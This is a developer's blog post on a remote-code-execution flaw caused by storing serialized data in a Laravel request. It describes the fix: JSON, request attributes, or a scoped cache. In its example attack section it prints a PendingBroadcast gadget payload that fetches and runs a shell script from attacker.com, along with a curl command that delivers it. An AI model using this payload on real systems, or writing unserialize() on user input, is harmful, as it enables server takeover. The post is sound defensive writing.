---
title: Innocent cache leading to RCE vulnerability
date: 2026-02-09
categories: [Security]
---

Recently, I encountered an interesting case of a Remote Code Execution (RCE) vulnerability that was caused by an innocent cache mechanism. We had some code that was invoked
in the middleware, so before the actual endpoint was invoked. There was a need to save data somewhere that was needed in both the middleware and the actual endpoint logic.
This data had only a request lifetime, so saving it in the database or in a cache system like Redis wasn't the best approach. 

## Problem
Someone decided to use the simplest approach and save this data in the request object itself. The problem was that the request does not accept objects, 
so the data was serialized and saved as a string. 

```php
$request->request->set('some_parameter', serialize($data));
```

Perhaps this solution was even recommended by AI, because I described the problem with passing the data from middleware to the logic invoked later, 
asked GitHub Copilot to solve that problem, and the first suggestion was to serialize the data and save it as a string in the request.

The problem with this approach is that someone with malicious intent can inject this additional parameter 'some_parameter' to the application and invoke deserialization of the payload, which 
leads to Remote Code Execution (RCE) vulnerability.

### Example Attack Payload

An attacker could craft a malicious serialized object that exploits Laravel's PendingBroadcast class (or similar classes with __destruct magic methods). Here's an example:

```php
<?php
namespace Illuminate\Broadcasting;

class PendingBroadcast {
    protected $events;
    protected $event;

    public function __construct($command) {
        $this->events = new \Illuminate\Events\Dispatcher();
        $this->event = $command;
    }
}

// Create a malicious object that will execute a system command
$malicious = new PendingBroadcast('system("wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh");');
$payload = serialize($malicious);
echo $payload;
// Output: O:39:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"*events";O:28:"Illuminate\Events\Dispatcher":0:{}s:8:"*event";s:58:"system("wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh")";}
```

The attacker would then send a request with the serialized payload directly as a POST parameter:

```bash
curl -X POST "https://vulnerable-app.com/endpoint" \
  --data-urlencode 'some_parameter=O:39:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"*events";O:28:"Illuminate\Events\Dispatcher":0:{}s:8:"*event";s:58:"system(\"wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh\")";}'
```

When the application calls `unserialize($request->get('some_parameter'))`, the malicious object is reconstructed and its `__destruct()` method executes the injected command. The `--data-urlencode` flag handles proper URL encoding of special characters in the serialized string.

## Fix

At first glance, I noticed that PHPStorm was showing a warning about using the `unserialize` method, suggesting I should add the allowed classes parameter. For a moment, 
I thought that would be enough to fix the vulnerability, but unfortunately, there is information in the php.net docs that says otherwise:

> **Warning**  
> Do not pass untrusted user input to unserialize() regardless of the options value of allowed_classes. Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via json_decode() and json_encode()) if you need to pass serialized data to the user.


The proper solution is to **never use `serialize()`/`unserialize()` on user-controllable data**. Instead, there are several safe alternatives:

### Option 1: Use JSON encoding

This approach requires more work to encode/decode complex data structures, but it's much safer. It's also better for maintainability because you can easily change
namespaces and class names without breaking the serialization format.

### Option 2: Use Request Attributes
Laravel's Request object has an `attributes` property specifically designed for this purpose - storing arbitrary data during the request lifecycle:

```php
$request->attributes->set('some_parameter', $data);
```

### Option 3: Use a cache service without serialization with only one instance per request lifetime
```php
// provider
$this->app->scoped(ServiceCache::class); // one instance per request
```

Inside this ServiceCache class you can simply store some data that will be reused later. 
Keep in mind potential memory problems if you store too much data there, but if it's just a few small objects, it should be fine.


## Conclusion

This case demonstrates how even seemingly innocent decisions can introduce critical security vulnerabilities. If you need serialization, make sure to 
use a safe format like JSON, and never use `unserialize()` on user-controllable data.
